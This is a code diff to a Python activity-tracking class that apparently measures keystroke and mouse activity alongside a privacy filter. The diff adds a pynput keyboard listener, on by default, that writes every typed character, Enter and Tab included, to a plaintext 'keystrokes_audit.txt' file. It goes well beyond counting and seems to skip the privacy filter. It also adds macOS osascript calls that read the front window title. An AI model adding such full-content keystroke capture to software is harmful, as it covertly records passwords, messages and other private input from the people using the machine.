@@ -15,6 +15,13 @@ try:
 except ImportError:
     HAS_WIN32 = False
 
+# Pynput bindings for live keystroke monitoring
+try:
+    from pynput import keyboard
+    HAS_PYNPUT = True
+except (ImportError, Exception):
+    HAS_PYNPUT = False
+
 # Import Privacy Filter (Task 6)
 try:
     from src.core.privacy_filter import PrivacyFilter
@@ -23,7 +30,7 @@ except ImportError:
 
 
 class ActivityTracker:
-    def __init__(self, poll_interval: float = 2.0):
+    def __init__(self, poll_interval: float = 2.0, enable_keystrokes: bool = True):
         self.privacy_filter = PrivacyFilter()
         self.poll_interval = poll_interval
         
@@ -35,9 +42,43 @@ class ActivityTracker:
         # Activity metrics counters (KPM / keystrokes / mouse activity)
         self.keystroke_count = 0
         self.mouse_click_count = 0
+        self.enable_keystrokes = enable_keystrokes
+        self.keystroke_log_file = "keystrokes_audit.txt"
+        self._keyboard_listener = None
+        self.keystroke_buffer = []
         
         # In-memory snapshot cache
         self.current_snapshot: Dict[str, Any] = {}
+
+    def _on_key_press(self, key):
+        """Callback for keyboard event monitoring."""
+        if not self.enable_keystrokes:
+            return
+        self.record_keystroke()
+        try:
+            if hasattr(key, 'char') and key.char:
+                char = key.char
+            elif hasattr(key, 'name'):
+                if key.name == 'enter':
+                    char = "\n"
+                elif key.name == 'space':
+                    char = " "
+                elif key.name == 'tab':
+                    char = "\t"
+                else:
+                    char = f"[{key.name}]"
+            else:
+                char = f"[{str(key)}]"
+
+            with self._lock:
+                self.keystroke_buffer.append(char)
+                if len(self.keystroke_buffer) > 200:
+                    self.keystroke_buffer.pop(0)
+            if self.keystroke_log_file:
+                with open(self.keystroke_log_file, "a", encoding="utf-8") as f:
+                    f.write(char)
+        except Exception:
+            pass
 
     def record_keystroke(self):
         """Thread-safe increment of keystroke counts."""
@@ -95,6 +136,22 @@ class ActivityTracker:
                         app_name = proc.name()
             except Exception:
                 pass
+        elif platform.system() == "Darwin":
+            try:
+                import subprocess
+                cmd_app = "osascript -e 'tell application \"System Events\" to get name of first application process whose frontmost is true'"
+                app_res = subprocess.check_output(cmd_app, shell=True, text=True, timeout=1).strip()
+                if app_res:
+                    app_name = app_res
+                cmd_title = "osascript -e 'tell application \"System Events\" to tell (first application process whose frontmost is true) to get name of front window'"
+                try:
+                    title_res = subprocess.check_output(cmd_title, shell=True, text=True, timeout=1).strip()
+                    raw_title = f"{app_res} - {title_res}" if title_res else app_res
+                except Exception:
+                    raw_title = app_res or "macOS Active Application"
+            except Exception:
+                raw_title = "macOS Active Application"
+                app_name = "System Process"
         else:
             raw_title = "Active Application (Platform Fallback)"
             app_name = "System Process"
@@ -130,16 +187,32 @@ class ActivityTracker:
             time.sleep(self.poll_interval)
 
     def start(self):
-        """Starts background tracking thread."""
+        """Starts background tracking thread and keyboard listener."""
         if not self._running:
             self._running = True
             self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
             self._thread.start()
             print("[ACTIVITY TRACKER] Background monitor loop started.")
 
+            # Start pynput keyboard listener if available
+            if HAS_PYNPUT and self.enable_keystrokes and not self._keyboard_listener:
+                try:
+                    self._keyboard_listener = keyboard.Listener(on_press=self._on_key_press)
+                    self._keyboard_listener.daemon = True
+                    self._keyboard_listener.start()
+                    print("[ACTIVITY TRACKER] Live keyboard listener started.")
+                except Exception as e:
+                    print(f"[ACTIVITY TRACKER] Keyboard listener notice: {e}")
+
     def stop(self):
-        """Stops background tracking thread cleanly."""
+        """Stops background tracking thread and keyboard listener cleanly."""
         self._running = False
+        if self._keyboard_listener:
+            try:
+                self._keyboard_listener.stop()
+            except Exception:
+                pass
+            self._keyboard_listener = None
         if self._thread and self._thread.is_alive():
             self._thread.join(timeout=1.0)
             print("[ACTIVITY TRACKER] Background monitor loop stopped.")
